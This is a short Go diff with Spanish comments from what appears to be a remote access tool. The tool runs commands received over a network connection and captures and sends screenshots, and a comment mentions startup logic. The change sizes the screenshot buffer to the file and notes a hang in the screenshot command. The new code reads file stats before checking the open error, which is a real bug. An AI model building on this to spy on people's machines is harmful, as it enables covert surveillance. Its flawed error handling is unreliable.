@@ -25,15 +25,19 @@ import (
 	"github.com/kbinani/screenshot"
 )
 
-const TAMAÑO_BUFFER = 1024
+const TAMAÑO_BUFFER = 1024 // buffer para comandos promedios
 
 // aca voy a poner la logica del startup y la ejecucion de comandos
 
 // funcion similar a Envio( ) con la unica diferencia de que es para enviar imagenes por la red
 func Enviar_img(conexion net.Conn, archivo string) error {
-	buffer_img := make([]byte, 1_000_000)
 	buffer_tamaño := make([]byte, 8)
+
 	imagen, error := os.Open(archivo)
+	stat, _ := imagen.Stat() // obtengo stats de la imagen
+
+	buffer_img := make([]byte, stat.Size()) // obtengo el tamaño y creo un buffer
+
 	if error != nil {
 		return errors.New("no se encuentra la imagen")
 	}
@@ -155,7 +159,8 @@ func Cliente(cliente net.Conn) {
 		Cd(entrada, cliente)
 
 	} else if entrada == "ss" { // logica de ss
-
+		// arreglar fallo: se queda trabado en ocaciones y afecta al programa
+		// crear una gorountine con un context
 		err := Ss(cliente)
 		if err != nil {
 			fmt.Println("error al hacer screenshot: ", err)
